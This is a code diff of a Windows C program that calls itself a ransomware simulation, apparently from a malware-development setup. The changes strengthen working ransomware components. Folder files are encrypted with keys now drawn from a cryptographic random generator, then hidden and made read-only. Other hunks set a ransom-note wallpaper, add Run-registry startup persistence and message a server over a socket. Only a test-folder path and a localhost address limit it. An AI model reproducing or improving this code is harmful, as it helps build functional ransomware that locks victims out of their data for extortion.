@@ -1,8 +1,10 @@
+#include <winsock2.h>
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <winsock2.h>
+#include <ws2tcpip.h> // Needed for inet_pton
+#include <wincrypt.h>
 
 #pragma comment(lib, "ws2_32.lib") // Link WinSock library
 
@@ -30,10 +32,10 @@ void encrypt_file(const char* filename, unsigned char* key, unsigned char* iv);
 
 int main() {
     // Example folder for scanning
-    const char* folder_to_scan = "C:\\TestFolder";
+    const char* folder_to_scan = "C:\\Users\\MALDEV01\\Documents\\TestFolder";
 
     // Example wallpaper image path
-    const char* wallpaper_path = "C:\\ransom_note.bmp";
+    const char* wallpaper_path = "C:\\Users\\MALDEV01\\Pictures\\ransom_note.bmp";
 
     printf("Starting ransomware simulation...\n");
 
@@ -63,10 +65,18 @@ void scan_and_encrypt(const char* folder_path) {
     hFind = FindFirstFile(search_path, &find_data);
 
     if (hFind == INVALID_HANDLE_VALUE) {
-        printf("Error: Unable to access folder.\n");
+        DWORD error = GetLastError();
+        if (error == ERROR_PATH_NOT_FOUND) {
+            printf("Error: Folder does not exist: %s\n", folder_path);
+        }
+        else if (error == ERROR_ACCESS_DENIED) {
+            printf("Error: Access denied to folder: %s\n", folder_path);
+        }
+        else {
+            printf("Error: Unable to access folder. Error: %lu\n", error);
+        }
         return;
     }
-
     do {
         if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
             char full_path[MAX_PATH_LEN];
@@ -80,9 +90,12 @@ void scan_and_encrypt(const char* folder_path) {
             encrypt_file(full_path, key, iv);
 
             // Mark file as hidden and read-only
-            SetFileAttributes(full_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY);
-
-            printf("Encrypted and secured file: %s\n", full_path);
+            if (!SetFileAttributes(full_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY)) {
+                printf("Failed to set file attributes for: %s. Error: %lu\n", full_path, GetLastError());
+            }
+            else {
+                printf("Encrypted and secured file: %s\n", full_path);
+            }
         }
     } while (FindNextFile(hFind, &find_data) != 0);
 
@@ -91,11 +104,14 @@ void scan_and_encrypt(const char* folder_path) {
 
 // Helper to generate random key and IV
 void generate_key_and_iv(unsigned char* key, unsigned char* iv) {
-    for (int i = 0; i < KEY_SIZE; i++) {
-        key[i] = rand() % 256;
+    HCRYPTPROV hProvider;
+    if (CryptAcquireContext(&hProvider, NULL, NULL, PROV_RSA_FULL, 0)) {
+        CryptGenRandom(hProvider, KEY_SIZE, key);
+        CryptGenRandom(hProvider, IV_SIZE, iv);
+        CryptReleaseContext(hProvider, 0);
     }
-    for (int i = 0; i < IV_SIZE; i++) {
-        iv[i] = rand() % 256;
+    else {
+        printf("Failed to generate secure random numbers. Error: %lu\n", GetLastError());
     }
 }
 
@@ -111,7 +127,7 @@ void set_ransom_wallpaper(const char* image_path) {
         printf("Ransom note set as wallpaper: %s\n", image_path);
     }
     else {
-        printf("Failed to set wallpaper.\n");
+        printf("Failed to set wallpaper. Error: %lu\n", GetLastError());
     }
 }
 
@@ -122,19 +138,22 @@ void add_to_startup() {
     const char* app_name = "RansomSim";
     char exe_path[MAX_PATH_LEN];
 
-    GetModuleFileName(NULL, exe_path, MAX_PATH_LEN);
+    if (GetModuleFileName(NULL, exe_path, MAX_PATH_LEN) == 0) {
+        printf("Failed to get module file name. Error: %lu\n", GetLastError());
+        return;
+    }
 
     if (RegOpenKeyEx(HKEY_CURRENT_USER, reg_path, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
         if (RegSetValueEx(hKey, app_name, 0, REG_SZ, (const BYTE*)exe_path, strlen(exe_path) + 1) == ERROR_SUCCESS) {
             printf("Added to startup: %s\n", exe_path);
         }
         else {
-            printf("Failed to set registry key value.\n");
+            printf("Failed to set registry key value. Error: %lu\n", GetLastError());
         }
         RegCloseKey(hKey);
     }
     else {
-        printf("Failed to open registry key.\n");
+        printf("Failed to open registry key. Error: %lu\n", GetLastError());
     }
 }
 
@@ -145,23 +164,28 @@ void send_message_to_server(const char* message) {
     struct sockaddr_in server;
 
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
-        printf("WSAStartup failed.\n");
+        printf("WSAStartup failed. Error: %lu\n", WSAGetLastError());
         return;
     }
 
     s = socket(AF_INET, SOCK_STREAM, 0);
     if (s == INVALID_SOCKET) {
-        printf("Socket creation failed.\n");
+        printf("Socket creation failed. Error: %lu\n", WSAGetLastError());
         WSACleanup();
         return;
     }
 
-    server.sin_addr.s_addr = inet_addr("127.0.0.1");
     server.sin_family = AF_INET;
     server.sin_port = htons(8080);
+    if (inet_pton(AF_INET, "127.0.0.1", &server.sin_addr) <= 0) {
+        printf("Invalid address/ Address not supported.\n");
+        closesocket(s);
+        WSACleanup();
+        return;
+    }
 
     if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) {
-        printf("Connection to server failed.\n");
+        printf("Connection to server failed. Error: %lu\n", WSAGetLastError());
         closesocket(s);
         WSACleanup();
         return;
@@ -173,4 +197,3 @@ void send_message_to_server(const char* message) {
     closesocket(s);
     WSACleanup();
 }
-
